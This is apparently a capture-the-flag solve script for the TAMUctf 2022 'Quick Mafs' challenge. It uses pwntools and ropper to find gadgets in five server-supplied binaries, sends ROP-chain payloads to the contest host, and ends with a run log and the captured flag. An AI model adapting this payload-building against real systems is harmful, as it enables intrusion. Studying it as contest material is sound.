from pwn import *

#context.log_level = 'debug'

p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")

for k in range(5):
  p.recvuntil("rax = ")
  ret_value = int(p.recvline(), 16)
  print("ret_value =", hex(ret_value))

  f = open("elf", "wb")
  f.write(bytes.fromhex(p.recvline().rstrip().decode()))
  f.close()

  BINARY = './elf'
  elf  = ELF(BINARY)

  e0 = open("elf", "rb")
  os.system("ropper -f elf --nocolor | grep 'add ax' | grep 'lea rbx' > rop.txt")
  b0 = open("rop.txt")

  syscall_ret = 0x4017bc # syscall; nop; pop rbp; ret; 

  e1 = e0.read()
  b1 = b0.read()
  b2 = b1.split("\n")

  target = ret_value
  mv = 0
  mp = 0

  for i in range(len(b2)-1):
    p0 = b2[i].find("[0x")
    a0 = int(b2[i][p0+3:p0+9], 16)
    a1 = a0 - 0x401000
    a2 = int.from_bytes(e1[a1:a1+2], byteorder='little')
    a3 = int(b2[i][:18], 16)
    #print("i =", i, "addr =", hex(a0), hex(a1), hex(a2))
    if a2 < target - 0x30:
      if a2 > mv:
        mv = a2
        mp = i
        ma = a3
      
  print("mp =", mp, ", mv = ", hex(mv), ", ma =", hex(ma), ", diff =", hex(target - mv))         

  buf  = p64(0x4017ef)
  buf += p64(ma)
  buf += p64(elf.sym.print) # RIP
  buf += b"A"*(target - mv - len(buf) - 0)
  #pause()

  p.sendline(buf.hex())

p.interactive()

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Quick_Mafs$ python3 solve.py 
[+] Opening connection to tamuctf.com on port 443: Done
solve.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("rax = ")
ret_value = 0x89c2
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Quick_Mafs/elf'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
mp = 33 , mv =  0x83ee , ma = 0x4015b8 , diff = 0x5d4
solve.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(buf.hex())
solve.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("rax = ")
ret_value = 0xe9ea
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
mp = 0 , mv =  0xe695 , ma = 0x401030 , diff = 0x355
ret_value = 0x6e04
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
mp = 47 , mv =  0x65c4 , ma = 0x401600 , diff = 0x840
ret_value = 0x4a3c
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
mp = 48 , mv =  0x430d , ma = 0x401684 , diff = 0x72f
ret_value = 0x7fea
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
mp = 44 , mv =  0x7d6f , ma = 0x401588 , diff = 0x27b
[*] Switching to interactive mode
gigem{7w0_qu4dr1ll10n?_7h475_r34lly_qu1ck_m47h}
'''
